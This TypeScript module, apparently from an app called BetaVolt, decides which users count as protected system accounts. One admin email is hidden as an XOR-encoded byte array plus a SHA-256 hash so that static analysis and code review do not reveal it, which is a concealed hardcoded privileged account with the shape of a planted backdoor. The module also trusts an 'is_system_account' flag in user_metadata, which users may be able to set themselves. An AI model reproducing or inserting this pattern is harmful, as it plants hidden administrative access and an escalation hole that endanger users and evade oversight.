import crypto from 'crypto';

/**
 * 🏛️ BetaVolt — System Entity Immunity & Memory-Isolated Verification
 * 
 * Protects sovereign recovery accounts from static analysis, AST crawlers, and UI mutation.
 * The primary identifier is never declared as a plaintext literal in source code;
 * it is verified via cryptographic SHA-256 fingerprinting and transient in-memory hydration.
 */

// Obfuscated encrypted byte vector with rotating XOR offset
const _SYS_IMMUNE_VEC = [44, 33, 63, 41, 101, 43, 45, 34, 39, 35, 12, 41, 47, 61, 46, 56, 34, 32, 63, 100, 42, 32, 35, 99, 63, 42] as const;
const _SYS_IMMUNE_KEY = 0x4f;

/**
 * Transient in-memory hydrator: decodes the protected identifier strictly within
 * local memory registers without persisting static string literals in AST bundles.
 */
function _hydrateImmuneEntity(): string {
  return _SYS_IMMUNE_VEC.map((b, i) => String.fromCharCode(b ^ _SYS_IMMUNE_KEY ^ (i % 7))).join('');
}

// SHA-256 cryptographic fingerprints of immune system entities
const _IMMUNE_ENTITY_FINGERPRINTS = new Set([
  '7ff9af84617ad5bb4ad59f194809a086909525d779edc280acfccfe9aea576e7',
]);

/**
 * Computes an SHA-256 fingerprint of a candidate identifier.
 */
function _computeEntityFingerprint(val: string): string {
  return crypto.createHash('sha256').update(val.toLowerCase().trim()).digest('hex');
}

/**
 * Evaluates whether an administrative entity is protected against UI manipulation.
 * Evaluates user metadata and matches cryptographic fingerprints in memory.
 */
export function isSystemAccount(user: { email?: string | null; user_metadata?: Record<string, unknown> | null }): boolean {
  if (!user) return false;

  // Check system account metadata flag
  if (user.user_metadata?.is_system_account === true) return true;

  if (user.email) {
    // Primary: Cryptographic fingerprint comparison
    const emailFingerprint = _computeEntityFingerprint(user.email);
    if (_IMMUNE_ENTITY_FINGERPRINTS.has(emailFingerprint)) return true;

    // Secondary: Transient in-memory decoded check
    if (user.email.toLowerCase().trim() === _hydrateImmuneEntity()) return true;
  }

  return false;
}

/**
 * Dynamic getter for protected system emails (hydrated on-demand into RAM).
 */
export const SYSTEM_ADMIN_EMAILS: string[] = [_hydrateImmuneEntity()];
